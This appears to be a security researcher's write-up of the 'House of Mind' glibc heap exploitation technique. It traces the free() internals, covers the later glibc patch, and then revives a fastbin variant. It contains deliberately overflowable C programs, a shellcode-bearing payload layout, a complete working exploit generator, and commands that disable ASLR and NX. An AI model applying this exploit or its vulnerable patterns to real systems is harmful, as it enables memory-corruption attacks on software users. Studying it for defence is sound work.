Ingredients:  

* One free() of a chunk under the control of the exploiter
* A sufficiently large memory space where the exploiter can write

This technique was described as the most general and plausible and probably the most similar to the good old unlink technique. The whole point here is to make the free function to believe that the chunk-to-be-freed doesn’t belong to the main arena (by setting, of course, the NON_MAIN_ARENA flag in the chunk space itself). In order to understand this at best, it is required to give a look at the free source code in the [2.3.5](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e3ccbde7b5b84affbf6ff2387a5151310235f0a3;hb=1afdd17390f6febdfe559e16dfc5c5718f8934aa) version of glibc at line #3368:  
``` c
 void
public_fREe(Void_t* mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  [...]

  p = mem2chunk(mem);

  [...]

  ar_ptr = arena_for_chunk(p);

  [...]

  _int_free(ar_ptr, mem);
  (void)mutex_unlock(&ar_ptr->mutex);
}
```
The memory pointer is converted into the chunk pointer p by using the mem2chunk macro and, then, the corresponding arena is computed by using the arena_for_chunk macro. The arena pointer ar_ptr and the memory pointer are then passed to the _int_free function in order to free the memory space itself. A deeper look to the arena_for_chunk macro definition in the [arena.c](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/arena.c;h=8202aaf01b124e2dafc699f401bac5dde2cedb67;hb=1afdd17390f6febdfe559e16dfc5c5718f8934aa) file will enlighten the path that should be followed here:    
``` c
 #define HEAP_MAX_SIZE (1024*1024) /* must be a power of two */

#define heap_for_ptr(ptr) \
 ((heap_info *)((unsigned long)(ptr) & ~(HEAP_MAX_SIZE-1)))

/* check for chunk from non-main arena */
#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)

#define arena_for_chunk(ptr) \
 (chunk_non_main_arena(ptr) ? heap_for_ptr(ptr)->ar_ptr : &main_arena)
```
The arena_for_chunk macro just checks if the NON_MAIN_ARENA flag is set by calling the chunk_non_main_arena macro: if the flag is not set, then the main_arena pointer is returned, otherwise the heap_info address for that memory chunk is computed by calling heap_for_ptr and its ar_ptr field is returned. As HEAP_MAX_SIZE is normally set at 1MB, the heap_for_ptr just performs a “ptr AND 0xFFF00000” and returns the result. In short, when a non-main heap is created, it is always aligned to a multiple of HEAP_MAX_SIZE.  

As [K-sPecial](http://www.awarenetwork.org/etc/aware.ezine.1.alpha.txt) says, if the first allocated chunk is at 0x08012345 (remember that the NON_MAIN_ARENA flag has been forced to 1), then its arena pointer will be 0x08000000 (the arena pointer is the first field in the heap_info structure). This will probably end into a segmentation fault, as there’s no valid arena structure there. The trick is to make the program allocate more and more memory until a chunk is allocated over 0x08100000 in order to have the heap_info structure “located” at 0x08100000. Asking the program to allocate more and more memory might sound too much, but let’s think to an application using a socket: it could actually allocate memory in order to fill the buffer.  

The point here is that the ar_ptr variable can be changed to any value (even pointing to an environment variable) as it’s up to the exploiter to forge the heap_info structure. The first alternative is to make ar_ptr point to a sufficiently large memory space where the exploiter can write whatever he wants and use the unsorted_chunks to cause a memory overwrite.  

If the following conditions on the chunk are met, then the unsorted_chunks code is executed:  

* The negative of the size of the overflowed chunk must be less than the value of the chunk itself
* The size of the chunk must not be less than av->max_fast
* The IS_MMAPPED bit of the size cannot be set
* The overflowed chunk cannot equal av->top
* The NONCONTIGUOUS_BIT of av->max_fast must be set
* The PREV_INUSE bit of the nextchunk (chunk + size) must be set
* The size of nextchunk must be greater than 8
* The size of nextchunk must be less than av->system_mem
* The PREV_INUSE bit of the chunk must not be set
* The nextchunk cannot equal av->top
* The PREV_INUSE bit of the chunk after nextchunk (nextchunk + nextsize) must be set

Even if they look like a lot and difficult to apply all at the same time, the only “difficult” ones are the ones involving the nextchunk, as they depend on the specific scenario. For all the others, as the exploiter controls the most of the values, they’re not a big issue.  

If all these conditions are met, then the following piece of code at #4338 is executed:  
``` c
 /*
  Place the chunk in unsorted chunk list. Chunks are
  not placed into regular bins until after they have
  been given one chance to be used in malloc.
*/

bck = unsorted_chunks(av);
fwd = bck->fd;
p->bk = bck;
p->fd = fwd;
bck->fd = p;
fwd->bk = p;
```
Just like in the House of Prime, unsorted_chunks returns the address of av->bins[0], which is under the exploiter’s control. Then, fwd will be equal to `*(&av->bins[0] + 8)` and the fwd->bk = p line will overwrite the `*(&av->bins[0] + 8) + 12` location of memory with the p value. Phantasmal advices to store in &av->bins[0] + 8 the address of a .dtors entry – 8: doing this means that this value will be placed in fwd and DTORS_END will be overwritten with the p value by fwd->bk = p.  

K-sPecial proposed the following vulnerable program to be exploited:  
``` c

 /*
 * K-sPecial's vulnerable program slightly modified by gb_master
 */
#include <stdio.h>
#include <stdlib.h>

int main (void)
{
  char *ptr  = malloc(1024);
  char *ptr2;
  int heap = (int)ptr & 0xFFF00000, i;

  printf("ptr found at %p\n", ptr);

  // i == 2 because this is my second chunk to allocate
  for (i = 2; i < 1024; i++)
  {
    if (((int)(ptr2 = malloc(1024)) & 0xFFF00000) == (heap + 0x100000))
    {
      printf("good heap alignment found on malloc() %i (%p)\n", i, ptr2);
      break;
    }
  }

  malloc(1024); // ptr2 can't be av->top
  fread (ptr, 1024 * 1024, 1, stdin); // the overflow on ptr

  free(ptr);
  free(ptr2); // The House of Mind
  return 0;
}
```
and obtained the following output  
```
 ptr found at 0x804a008
good heap alignment found on malloc() 724 (0x81002a0)
```
The exploit he wrote is shown and described below:  
```
 0xAA 0xAA 0xAA 0xAA            will be overwritten with garbage by free()
0xAA 0xAA 0xAA 0xAA            will be overwritten with garbage by free()

0x00 0x00 0x00 0x00            av->mutex = 0

0x02 0x01 0x00 0x00            -\
0x02 0x01 0x00 0x00             |
0x02 0x01 0x00 0x00             | av->max_fast = 0x102 = 258
0x02 0x01 0x00 0x00             | (written multiple times just to be
0x02 0x01 0x00 0x00             | sure of hitting it)
0x02 0x01 0x00 0x00             |
0x02 0x01 0x00 0x00             |
0x02 0x01 0x00 0x00            -/

0x...  DTORS_END-12            -\
0x...  DTORS_END-12             | av->bins[0]
[...]                           | repeated 246 times 
0x...  DTORS_END-12            -/

0x09 0x04 0x00 0x00 malloc'ed chunk's size    -\
0x41 0x41 0x41 0x41 -\                         |
[...]                | garbage data * 257      |
0x41 0x41 0x41 0x41 -/                         | repeated 721 times
[...]                                          | (all the chunks)
0x09 0x04 0x00 0x00                            |
0x41 0x41 0x41 0x41                            |
[...]                                          |
0x41 0x41 0x41 0x41                           -/

0x09 0x04 0x00 0x00           size
1ST CHUNK ADDR + 8            -\
1ST CHUNK ADDR + 8             | this is the memory address returned that
1ST CHUNK ADDR + 8             | will be returned by heap_for_ptr: it is
1ST CHUNK ADDR + 8             | necessary to write the correct address for
[...]                          | ar_ptr here (256 times)
1ST CHUNK ADDR + 8            -/

0xEB 0x0C 0x90 0x90           jmp + 12

0x0D 0x04 0x00 0x00           size | NON_MAIN_ARENA

0x90 0x90 0x90 0x90           small NOP slide
0x90 0x90 0x90 0x90
0x.. 0x.. SHELLCODE
```
In short, K-sPecial created a fake arena where ptr is, he wrote garbage data between ptr and ptr2, faked an heap_info structure where 0x08100000 is, correctly set the size for ptr2 and wrote there a shellcode.  

Sadly, trying this technique today won’t work, as this vulnerability was patched in [glibc 2.11](https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=516d401991123581c6ac336ae14b44a6d6d5f61f;hp=0b9facefd4e326a46ac4d013094f05db8decc5d0;hb=f6887a0d9a55f5c80c567d9cb153c1c6582410f9;hpb=d0a2af710654a038903dd4a300030670bfbeaa2d) with the following additional check in the _int_free function:  
``` c
 bck = unsorted_chunks(av);
fwd = bck->fd;
if (__builtin_expect (fwd->bk != bck, 0))
  {
    errstr = "free(): corrupted unsorted chunks";
    goto errout;
  }
p->fd = fwd;
p->bk = bck;
```
This additional condition just checks the integrity of the unsorted_chunks list, in a similar way to what was already done to unlink. Anyway, something nasty is still possible, as described by [newlog](https://github.com/newlog) in this [document](http://www.overflowedminds.net/static/files/newlog/papers/linux_heap_exploiting_revisited.pdf). As the technique is already fully described in that document, I won’t copy-paste it here.  

So is House of Mind dead? Well, Phantasmal described another way of causing the memory overwrite: by using the fastbin code. As the piece of code involved is at the beginning of the _int_free function, this approach has the wonderful advantage of having less integrity checks to take care of. In fact, if we look at the code in [malloc.c](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e3ccbde7b5b84affbf6ff2387a5151310235f0a3;hb=1afdd17390f6febdfe559e16dfc5c5718f8934aa#l4244) at line #4244, we find the following:  
``` c
 if ((unsigned long)(size) <= (unsigned long)(av->max_fast)

#if TRIM_FASTBINS
    /*
      If TRIM_FASTBINS set, don't place chunks
      bordering top into fastbins
    */
    && (chunk_at_offset(p, size) != av->top)
#endif
    ) {

  if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
      || __builtin_expect (chunksize (chunk_at_offset (p, size))
	                   >= av->system_mem, 0))
    {
      errstr = "free(): invalid next size (fast)";
      goto errout;
    }

  set_fastchunks(av);
  fb = &(av->fastbins[fastbin_index(size)]);
  /* Another simple check: make sure the top of the bin is not the
     record we are going to add (i.e., double free).  */
  if (__builtin_expect (*fb == p, 0))
    {
      errstr = "double free or corruption (fasttop)";
      goto errout;
    }
  p->fd = *fb;
  *fb = p;
}
```
The game of pointers quite changed since this technique was invented, as there were some errors in its original presentation and K-sPecial apparently didn’t notice them in its review. Anyway, blackngel fixed the approach and published his final version. The achievement to be reached here is to set fb to the address of memory that is going to be overwritten (might be the return address of a function) and to have it overwritten with the overflowed chunk’s address thanks to the `*fb = p` line of code.  

The idea of using a “fake arena” when freeing the overflowed chunk still remains the same. As with the previous approach, a list of conditions must be met in order to execute that part of code:    

* The size of chunk must be less than av->maxfast
* The size of contiguous chunk (next chunk) to p must be greater than 8:
* The same chunk, at time, must be less than av->system_mem:
* What happens to the fastbin_index() macro when the size is 16?

 `fastbin_index(16) = (16 >> 3) - 2 = 0`  
So in short, everything reduces to:  

`fb = &(av->fastbins [0])`  
As blackngel says, this is more or less everything we need to perform a return address overwriting. In fact, if the vulnerable piece of code is inside a function, then EBP and EIP were pushed onto the stack when the function itself was called and, with a little bit of luck, after the pushed EBP there are zeroes, matching the following layout:  
```
 STACK:   ^
         |
         |      pushed EIP
         |      pushed EBP
         |      0x00000000
         |
```
If the fake arena starts were those zeroes are, the stack is used in the following way:  
```
 STACK:   ^
         |
         |      0xRAND_VAL     av->system_mem (av + 1848)
         |         ...
         |      pushed EIP     av->fastbins[0]
         |      pushed EBP     av->max_fast
         |      0x00000000     av->mutex
         |
```
Hopefully 0xRAND_VAL will be a good random value and will allow the code to bypass the checks.
As the size of p must be 16 and as it must have the NON_MAIN_ARENA and PREV_INUSE flags set, the final value for the size field will be 0x15. The following chunk will be located at p + 16 – 8 and its size, in order to match the requirements, can be easily set to 9. At the beginning of p there must be a JMP instruction in order to jump to the correct shellcode position (p’s next chunk falls actually in between this JMP instruction and the shellcode itself).  

After looking at how glibc’s implements this mechanism today I noticed that it didn’t change that much (I’m using glibc 2.20) and that probably this technique could still work nowadays. What actually changed is the structure of malloc_state, but this actually made our life a lot easier, as, instead of max_fast, we have now flags:  
``` c
 struct malloc_state
{
  /* Serialize access.  */
  mutex_t mutex;

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  ...
```
Instead of using the max_fast field, now there is the get_max_fast() macro that returns, by default, 64. AWESOME!!! What I did is to slightly modify K-sPecial’s program in order to have the allocation process inside a function, in order to change the return address pushed onto the stack when the function itself is called. This is how the code looks like now:  
``` c
 /*
 * K-sPecial's vulnerable program slightly modified by gb_master (again)
 */
#include <stdio.h>
#include <stdlib.h>

int fvuln (void)
{
  char *ptr  = malloc(1024);
  char *ptr2;
  int heap = (int)ptr & 0xFFF00000, i;
  int ret = 0;

  printf("ptr found at %p\n", ptr);

  // i == 2 because this is my second chunk to allocate
  for (i = 2; i < 1024; i++)
  {
    if (((int)(ptr2 = malloc(1024)) & 0xFFF00000) == (heap + 0x100000))
    {
      printf("good heap alignment found on malloc() %i (%p)\n", i, ptr2);
      break;
    }
  }

  fread (ptr, 1024 * 1024, 1, stdin);

  free(ptr);
  free(ptr2);

  return ret;
}

int main(void)
{
  fvuln();

  return 0;
}
```

Pay attention to that “int ret = 0;” which was required in order to assure that I have at least a 0x00000000 in the stack and use it for av->mutex.  
Please note that I compiled this code with the usual following options:    

`gcc hom.c -m32 -mpreferred-stack-boundary=2 -mno-accumulate-outgoing-args -o hom`  

and that I disabled ASLR with the command:  

`echo 0 > /proc/sys/kernel/randomize_va_space`  

The “problem” I had was to find an equivalent of the -zexecstack option for the heap, as the [NX](https://en.wikipedia.org/wiki/Nx_bit) bit protection is valid for the heap as well: it marks the areas of memory dedicated to the heap as non-executable. So, it came out that there’s an easy way to do that at kernel command-line level: adding noexec=off to the kernel options (please set this option only for testing purposes).   
So, next thing is to run the application and write down the output:    
```
 $ ./hom
ptr found at 0x804b008
good heap alignment found on malloc() 720 (0x8100280)
```
Then I needed the address where EBP had been pushed when fvuln() was called: attaching GDB to the running process did the trick (FYI it’s 0xFFFFCFA0 on my system). This is all the information and all the OS settings I needed in order to test this type of exploit.  
Writing the exploit has been pretty easy, given blackngel’s instructions:  
``` c
 #include <stdio.h>

#define EBPMINUS4  0xFFFFCF9C
#define N          720

// Just prints the Pwned string
unsigned char shellcode[] =
"\xeb\x17\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x06"
"\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x50\x77\x6e\x65"
"\x64\x21\x0a";

int main(void)
{
  int i, j;

  // Some filler for the whole ptr chunk + ptr2's prev_size
  for (i = 0; i < 1028; i++)
    putchar(0x41);

  for (i = 0; i < N - 3; i++)
  {
    fwrite("\x09\x04\x00\x00", 4, 1, stdout);
    for (j = 0; j < 1028; j++)
      putchar(0x41);
  }

  fwrite("\x09\x04\x00\x00", 4, 1, stdout);
  for (i = 0; i < (1024 / 4); i++)
  {
    putchar((EBPMINUS4 & 0x000000FF) >> 0);
    putchar((EBPMINUS4 & 0x0000FF00) >> 8);
    putchar((EBPMINUS4 & 0x00FF0000) >> 16);
    putchar((EBPMINUS4 & 0xFF000000) >> 24);
  }

  // ptr2's prev_size
  fwrite("\xeb\x16\x90\x90", 4, 1, stdout);

  // ptr2's size
  fwrite("\x15\x00\x00\x00", 4, 1, stdout);

  // NOP slide + nextchunk->size
  fwrite("\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x09\x00\x00\x00\x90\x90\x90\x90", 20, 1, stdout);

  // shellcode at the end
  fwrite(shellcode, sizeof(shellcode), 1, stdout);

  return 0;
}
```
As I said, I am running a Linux box with glibc 2.20 and this exploit, I can say, actually worked, giving me the expected output:  
```
 $ ./hom < payload
ptr found at 0x804b008
good heap alignment found on malloc() 720 (0x8100280)
Pwned!$
```
It’s important to remember that the .dtors and .got sections are now read-only thanks to the RELRO protection, so overwriting the EIP is one of the very few interesting options left. Anyway, doing this requires the cooperation of heap and stack, adding some more complication to the technique: this doesn’t mean, however, that the whole thing is not feasible.  

In conclusion, the patch committed by the glibc project’s maintainers fixes only part of the problem and no definitive patch was every committed since then. An analysis of what could patch the fastbin way is described at [this](http://em386.blogspot.com/2010/01/glibc-211-stops-house-of-mind.html) page.  